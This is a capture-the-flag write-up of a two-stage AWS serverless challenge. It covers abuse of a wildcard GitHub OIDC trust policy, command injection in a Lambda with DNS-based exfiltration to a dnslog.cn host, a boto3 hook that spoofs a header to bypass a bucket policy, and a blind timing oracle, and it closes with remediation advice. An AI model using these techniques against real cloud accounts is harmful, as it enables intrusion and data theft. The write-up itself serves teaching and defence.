<div align="center">
  <h1>☁️ Master Writeup: Cloud Escape CTF 2026 ☁️</h1>
  <h3>The Complete Narrative of Operation "Miss Me Yet?"</h3>
  <br/>
</div>

This document serves as the master narrative and combined technical summary of both stages of the Cloud Escape CTF. For command-by-command breakdowns and precise payloads, please refer to the individual Stage 1 and Stage 2 writeup files.

---

## 🌐 The Target Environment

The target was a modern AWS serverless architecture utilizing API Gateways, Lambda functions, S3 buckets, and CloudFront distributions. The defense strategy relied heavily on **Network Isolation** (VPCs without internet routing) and **Strict IAM Policies** (VPC condition keys and explicit denies).

---

## 🚩 Stage 1: "Have Some Faith"

### The Foothold (OIDC Exploitation)
The initial access point was a misconfigured `.git` repository containing Terraform state and IAM policy templates. We discovered that the GitHub Actions OIDC Trust Policy (`cicd-trust-policy.json.tpl`) contained a critical wildcard flaw:
`"token.actions.githubusercontent.com:sub": "repo:*/*:ref:refs/heads/corgi"`

This allowed *any* GitHub repository pushing to a branch named `corgi` to successfully assume the `cicdRole` in the target AWS account (`009661764077`). We created a malicious repository, triggered a workflow, and gained our initial AWS identity.

### The Vulnerability (Command Injection)
Using our assumed role, we enumerated the account and discovered an API Gateway triggering a Lambda function (`nslookupv2`). The Lambda took a `domain` parameter and insecurely executed it via `subprocess.run('/opt/nslookup ' + domain, shell=True)`.

This provided us with Remote Code Execution (RCE).

### The Exfiltration (DNS Side-Channel)
The S3 bucket containing the flag (`codec4f26c862a321ef5`) could only be read from within the VPC. Our Lambda executed inside this VPC, so it could read the flag. However, the VPC had no NAT Gateway (no outbound HTTP/HTTPS) and the Lambda lacked `s3:PutObject` permissions.

**The Bypass:** We abused the default AWS Route 53 VPC Resolver (`169.254.169.253`). While HTTP traffic was dropped, internal DNS queries for external domains are forwarded to the internet by AWS. We hex-encoded the flag and appended it as a subdomain to a controlled DNS server, successfully leaking the data:

```bash
/opt/nslookup 3161316a656c726c6667327969327330.ixz9wv.dnslog.cn
```
**Stage 1 Flag Captured:** `1a1jelrlfg2yi2s0`

---

## 🚩 Stage 2: "Miss Me Yet?"

### The Vulnerability (Arbitrary Code Execution)
Stage 2 introduced a new API endpoint (`/dev/code_exec`) that executed base64-encoded Python payloads via `exec()`. However, the environment was completely blind:
- Standard output (`stdout`) was swallowed.
- Exceptions triggered a generic `{"error":"Something went wrong!"}` response.
- Like Stage 1, there was zero internet egress.

### The IAM Bypass (Header Injection)
We discovered a leaked S3 Bucket Policy via a CloudFront `docs.html` page for bucket `site781fe43f26b9eba3`. The policy allowed `GetObject` access for all files, provided the request originated from the VPC **AND** contained the header `User-Agent: Amazon CloudFront`.

Using our arbitrary Python execution, we injected a `boto3` event hook to spoof this header on all outgoing S3 requests originating from the Lambda:
```python
s3.meta.events.register('before-send.s3.*', lambda request, **kwargs: request.headers.update({'User-Agent': 'Amazon CloudFront'}))
```

### The Exfiltration (High-Precision Timing Oracle)
Because we could not print the flag or send it outward, we turned the synchronous nature of the API Gateway against itself. We developed a **Blind Timing Oracle**. 

By reading the flag in memory and iterating through its characters, we instructed the Lambda to `time.sleep(2.0)` if our guessed character was correct. 

```python
if flag[pos] == guess:
    time.sleep(2.0)
```
- **Incorrect Guess:** API responds in ~3-4 seconds.
- **Correct Guess:** API responds in ~9-13 seconds.

Using a multi-threaded local Python script, we performed a parallel binary search against this timing oracle, extracting the 7-character flag with 100% accuracy in mere minutes.

**Stage 2 Flag Captured:** `0102013`

---

## 🛡️ Remediation Summary

1. **OIDC Wildcards:** Never use `repo:*/*` in OIDC trust conditions. Always explicitly define the organization and repository.
2. **Command Injection:** Avoid `shell=True` in Python subprocesses. Pass arguments as lists and validate input rigorously.
3. **Execution Contexts:** Do not expose `eval()` or `exec()` endpoints to untrusted user input.
4. **VPC Isolation:** Relying on VPC isolation is insufficient if DNS resolution (`Route 53 Resolver`) is left active and unmonitored. 
5. **Header-Based Security:** Never use easily spoofed HTTP headers (like `User-Agent`) as a primary security boundary in IAM policies. Rely on `aws:PrincipalArn` or strict VPC Endpoints.

---
*End of Report — Agent freecandy*
